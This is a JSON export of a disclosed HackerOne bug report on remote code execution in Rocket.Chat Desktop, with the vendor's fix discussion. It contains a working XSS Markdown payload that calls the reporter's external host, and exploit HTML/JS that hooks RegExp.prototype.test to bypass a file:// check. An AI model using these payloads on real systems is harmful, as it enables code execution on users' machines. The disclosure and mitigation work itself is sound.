{"id":276031,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzYwMzE=","url":"https://hackerone.com/reports/276031","title":"Remote Code Execution in Rocket.Chat Desktop","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-10-10T06:22:44.191Z","submitted_at":"2017-10-10T06:22:44.191Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mattaustin","url":"/mattaustin","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":19858,"url":"https://hackerone.com/rocket_chat","handle":"rocket_chat","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Rocket.Chat","twitter_handle":"RocketChat","website":"https://rocket.chat","about":"Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-09-18T22:00:43.878Z","bug_reporter_agreed_on_going_public_at":"2018-08-19T22:00:40.456Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** The Markdown parser can be tricked into allowing arbitrary Javascript leading to \"remote code execution\". \n\n**Description:** \nBy combining the \"link\" and inline code block we can trick the parser into breaking out of the current HTML attribute. \n\nThis allows us to control other attributes of the tag and trigger javascript events. \n```\n[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';\"`hax`zzz)\n```\nbecomes \n```html\n\u003ca href=\"\u0026lt;a href=\" http:=\"\" hax=\"\" onmouseover=\"location='https://maustin.net/hax/rocket/hack.html';\u0026quot;\u0026quot;\" target=\"_blank\" rel=\"noopener noreferrer\"\u003e\n```\n\nThis is a simple redirect to: https://maustin.net/hax/rocket/hack.html\n\nFrom this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because: \n\u003e      \"open 'file://localhost/Volumes/Macintosh HD/foo.txt'\" opens the document\n     in the default application for its type (as determined by LaunchSer-\n     vices).\n\nNote:  For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)\n\nIn https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45 all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href); \n\nNormally preload javascript is an \"isolated scope\" in this case however the code is directly attached to the user controlled DOM as the \"window.onload\" handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\\\\/\\\\/ check send our application path to openExternal.\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n    \u003chead\u003e\n      \u003cscript\u003e\n        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {\n          apply: function(target, thisArg, argumentsList) {\n            console.log(thisArg.source);\n          console.log(argumentsList[0]);\n          if((thisArg.source == '^file:\\\\/\\\\/.+') \u0026\u0026 (argumentsList[0] === 'file:///Applications/Calculator.app')){\n            return false;\n          }\n          return Reflect.apply(target, thisArg, argumentsList)\n          }\n        });\n        setTimeout(()=\u003e{\n            a = document.createElement(\"A\")\n            a.href=\"file:///Applications/Calculator.app\"\n            document.body.appendChild(a)\n            a.click()\n        }, 3000);\n      \u003c/script\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n     \u003ch1\u003e3...2...1...ðŸš€\u003c/h1\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Releases Affected:\n\n  * \u003e= 2.9.0\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Create a new channel to test in. \n  1. Send the following snippet of markdown: \n```\n[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';\"`hax`zzz)\n```\n  1. Move your mouse over the link you just send and \n\n## Supporting Material/References:\n\n  * https://youtu.be/HPlwlc2J-LQ\n\n## Suggested mitigation\n\n  * The markdown parser needs a little love to prevent the initial xss. \n  * I believe you should be able to use something like  `window.addEventListener(\"load\",` .. to execute the checks in the proper scope. \n","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e The Markdown parser can be tricked into allowing arbitrary Javascript leading to \u0026quot;remote code execution\u0026quot;. \u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e \u003cbr\u003e\nBy combining the \u0026quot;link\u0026quot; and inline code block we can trick the parser into breaking out of the current HTML attribute. \u003c/p\u003e\n\n\u003cp\u003eThis allows us to control other attributes of the tag and trigger javascript events. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[ hax ](http://hax//onmouseover=location=\u0026#39;https://maustin.net/hax/rocket/hack.html\u0026#39;;\u0026quot;`hax`zzz)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ebecomes \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;lt;a href=\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehttp:=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehax=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonmouseover=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;location=\u0026#39;https://maustin.net/hax/rocket/hack.html\u0026#39;;\u0026amp;quot;\u0026amp;quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etarget=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;_blank\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003erel=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;noopener noreferrer\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is a simple redirect to: \u003ca title=\"https://maustin.net/hax/rocket/hack.html\" href=\"/redirect?url=https%3A%2F%2Fmaustin.net%2Fhax%2Frocket%2Fhack.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://maustin.net/hax/rocket/hack.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eFrom this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because: \u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e \u0026quot;open \u0026#39;file://localhost/Volumes/Macintosh HD/foo.txt\u0026#39;\u0026quot; opens the document\n in the default application for its type (as determined by LaunchSer-\n vices).\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eNote:  For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)\u003c/p\u003e\n\n\u003cp\u003eIn \u003ca title=\"https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FRocketChat%2FRocket.Chat.Electron%2Fblob%2Fmaster%2Fsrc%2Fpublic%2Fpreload.js%23L45\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href); \u003c/p\u003e\n\n\u003cp\u003eNormally preload javascript is an \u0026quot;isolated scope\u0026quot; in this case however the code is directly attached to the user controlled DOM as the \u0026quot;window.onload\u0026quot; handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\\/\\/ check send our application path to openExternal.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eRegExp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprototype\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eProxy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eRegExp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprototype\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"na\"\u003eapply\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etarget\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ethisArg\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eargumentsList\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ethisArg\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esource\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n          \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eargumentsList\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n          \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003ethisArg\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esource\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e^file:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003e/.+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eargumentsList\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efile:///Applications/Calculator.app\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)){\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n          \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nb\"\u003eReflect\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eapply\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etarget\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ethisArg\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eargumentsList\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003esetTimeout\u003c/span\u003e\u003cspan class=\"p\"\u003e(()\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eA\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003efile:///Applications/Calculator.app\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n            \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"mi\"\u003e3000\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n     \u003cspan class=\"nt\"\u003e\u0026lt;h1\u0026gt;\u003c/span\u003e3...2...1...ðŸš€\u003cspan class=\"nt\"\u003e\u0026lt;/h1\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"releases-affected\"\u003eReleases Affected:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u0026gt;= 2.9.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"steps-to-reproduce-from-initial-installation-to-vulnerability\"\u003eSteps To Reproduce (from initial installation to vulnerability):\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a new channel to test in. \u003c/li\u003e\n\u003cli\u003eSend the following snippet of markdown: \n\u003ccode\u003e\n[ hax ](http://hax//onmouseover=location=\u0026#39;https://maustin.net/hax/rocket/hack.html\u0026#39;;\u0026quot;`hax`zzz)\n\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eMove your mouse over the link you just send and \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://youtu.be/HPlwlc2J-LQ\" href=\"/redirect?url=https%3A%2F%2Fyoutu.be%2FHPlwlc2J-LQ\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://youtu.be/HPlwlc2J-LQ\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"suggested-mitigation\"\u003eSuggested mitigation\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe markdown parser needs a little love to prevent the initial xss. \u003c/li\u003e\n\u003cli\u003eI believe you should be able to use something like  \u003ccode\u003ewindow.addEventListener(\u0026quot;load\u0026quot;,\u003c/code\u003e .. to execute the checks in the proper scope. \u003c/li\u003e\n\u003c/ul\u003e\n","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-09-18T22:00:40.574Z","allow_singular_disclosure_after":-71911213.22162202,"singular_disclosure_allowed":true,"vote_count":11,"voters":["8ayac","mattaustin","dmatrix","michael1026","mygf","secgeek","eveeez","tester2020","cryptographer","thedeadgirlishere","and 1 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2056152,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @mattaustin \nI'm working to fix the issue ASAP.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/mattaustin\"\u003e@mattaustin\u003c/a\u003e \u003cbr\u003e\nI\u0026#39;m working to fix the issue ASAP.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-10T12:20:29.552Z","updated_at":"2017-10-10T12:20:29.552Z","actor":{"username":"rodrigok","cleared":false,"url":"/rodrigok","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/360/1a6d66a0def8a814709f86083492a3d43292901f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2056289,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @mattaustin \nThe first part of the issue was solved at this PR https://github.com/RocketChat/Rocket.Chat/pull/8451 can you take a look?\n\nI didn't added the tests to the PR now to not disclosure the bug","markdown_message":"\u003cp\u003eHi \u003ca href=\"/mattaustin\"\u003e@mattaustin\u003c/a\u003e \u003cbr\u003e\nThe first part of the issue was solved at this PR \u003ca title=\"https://github.com/RocketChat/Rocket.Chat/pull/8451\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FRocketChat%2FRocket.Chat%2Fpull%2F8451\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/RocketChat/Rocket.Chat/pull/8451\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e can you take a look?\u003c/p\u003e\n\n\u003cp\u003eI didn\u0026#39;t added the tests to the PR now to not disclosure the bug\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-10T13:23:03.304Z","updated_at":"2017-10-10T13:23:03.304Z","actor":{"username":"rodrigok","cleared":false,"url":"/rodrigok","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/360/1a6d66a0def8a814709f86083492a3d43292901f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2060414,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This looks like it should solve it. I think replacing with tokens until then end is a much better way to go. I think it is still worth looking at the on load event as well to mitigate the risk from any other XSS","markdown_message":"\u003cp\u003eThis looks like it should solve it. I think replacing with tokens until then end is a much better way to go. I think it is still worth looking at the on load event as well to mitigate the risk from any other XSS\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-11T23:39:55.800Z","updated_at":"2017-10-11T23:39:55.800Z","actor":{"username":"mattaustin","cleared":false,"url":"/mattaustin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2064686,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"Can you provide me your email, I'll pass to Sing Li to send you a swag :)","markdown_message":"\u003cp\u003eCan you provide me your email, I\u0026#39;ll pass to Sing Li to send you a swag :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-13T18:24:59.452Z","updated_at":"2017-10-13T18:24:59.452Z","actor":{"url":"/rocket_chat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Rocket.Chat"}},"reporter":{"username":"mattaustin","url":"/mattaustin"},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2064766,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"sure its: matt@m-austin.com  Thanks!!","markdown_message":"\u003cp\u003esure its: \u003ca title=\"matt@m-austin.com\" href=\"mailto:matt@m-austin.com\" rel=\"nofollow noopener noreferrer\"\u003ematt@m-austin.com\u003c/a\u003e  Thanks!!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-13T18:46:03.668Z","updated_at":"2017-10-13T18:46:16.581Z","actor":{"username":"mattaustin","cleared":false,"url":"/mattaustin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2756896,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"I'll close this issue since it was already solver.\n\nPlease open a new one if we missed something.\n\nThanks","markdown_message":"\u003cp\u003eI\u0026#39;ll close this issue since it was already solver.\u003c/p\u003e\n\n\u003cp\u003ePlease open a new one if we missed something.\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-17T12:49:09.271Z","updated_at":"2018-05-17T12:49:09.271Z","actor":{"username":"rodrigok","cleared":false,"url":"/rodrigok","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/360/1a6d66a0def8a814709f86083492a3d43292901f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mattaustin","url":"/mattaustin"},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3217979,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-19T22:00:40.506Z","updated_at":"2018-08-19T22:00:40.506Z","first_to_agree":true,"actor":{"username":"mattaustin","cleared":false,"url":"/mattaustin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3355875,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-18T22:00:44.042Z","updated_at":"2018-09-18T22:00:44.042Z","actor":{"url":"/rocket_chat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Rocket.Chat"}},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}